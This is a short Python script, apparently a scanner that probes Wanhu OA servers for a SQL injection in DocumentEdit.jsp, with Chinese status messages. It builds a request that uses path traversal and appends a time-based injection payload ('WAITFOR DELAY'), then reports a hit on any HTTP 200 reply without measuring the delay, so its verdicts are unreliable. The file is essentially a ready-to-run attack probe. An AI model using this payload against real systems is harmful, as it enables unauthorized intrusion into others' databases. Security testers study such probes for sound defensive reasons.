import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    print(now_time() + " [INFO]     正在检测万户OA DocumentEdit.jsp SQL注入漏洞")
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            print(now_time() + " [SUCCESS]     存在万户OA DocumentEdit.jsp SQL注入漏洞{}\n".format(target_url))
        else:
            print(now_time() + " [WARNING]  不存在万户OA DocumentEdit.jsp SQL注入漏洞\n")
    except:
        print(now_time() + " [ERROR]    目标请求失败 \n")
